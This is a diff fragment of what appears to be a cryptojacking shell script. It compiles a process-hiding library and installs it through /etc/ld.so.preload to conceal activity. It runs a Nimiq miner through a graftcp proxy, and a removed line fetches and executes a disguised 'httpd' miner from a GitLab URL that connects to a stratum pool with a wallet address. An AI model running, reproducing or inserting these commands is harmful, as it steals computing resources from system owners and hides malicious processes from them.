@@ -74,4 +74,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./sempak -d=0 -a "NQ82UYV095UD9MST21399ABS 6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n GPU-Sage -t 4  -i Disable & ./graftcp/graftcp wget https://gitlab.com/mulungweb2020/httpd/-/raw/main/httpd && chmod 700 httpd && ./httpd -a yescryptr16 -o stratum+tcp://43.133.156.187:443 -u bq1q27vkemvhlqtp2d46lvuzuw7mvul8lyg0ruh4mr.CPU-Sage -t $(nproc) -p m=solo
+./graftcp/graftcp ./sempak -d=0 -a "NQ82UYV095UD9MST21399ABS 6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n GPU-Sage -t 4  -i Disable
